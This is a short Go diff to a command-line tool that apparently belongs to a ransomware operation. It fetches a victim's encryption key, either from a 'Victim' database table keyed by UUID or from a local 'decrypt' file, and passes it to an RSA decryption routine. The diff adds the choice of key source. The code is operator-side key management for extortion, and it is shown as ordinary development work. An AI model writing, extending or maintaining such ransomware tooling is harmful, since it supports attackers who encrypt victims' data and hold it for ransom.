@@ -10,19 +10,31 @@ import (
 )
 
 func main() {
-	if len(os.Args) < 2 {
+	if len(os.Args) < 3 {
 		log.Fatalf("you need to provide user's id")
 	}
 
-	database.ConnectToDatbase()
-	db := database.GetDatabase()
+	var key []byte
+	if os.Args[2] == "database" {
+		database.ConnectToDatbase()
+		db := database.GetDatabase()
 
-	var victim database.Victim
-	if err := db.Where(&database.Victim{UUID: os.Args[1]}).Find(&victim).Error; err != nil {
-		log.Fatal(err)
+		var victim database.Victim
+		if err := db.Where(&database.Victim{UUID: os.Args[1]}).Find(&victim).Error; err != nil {
+			log.Fatal(err)
+		}
+
+		key = victim.EncryptionKey
+	} else {
+		fileData, err := ioutil.ReadFile("./decrypt")
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		key = fileData
 	}
 
-	out, err := utils.DecryptRSA(os.Args[1], victim.EncryptionKey)
+	out, err := utils.DecryptRSA(os.Args[1], key)
 	if err != nil {
 		log.Fatal(err)
 	}
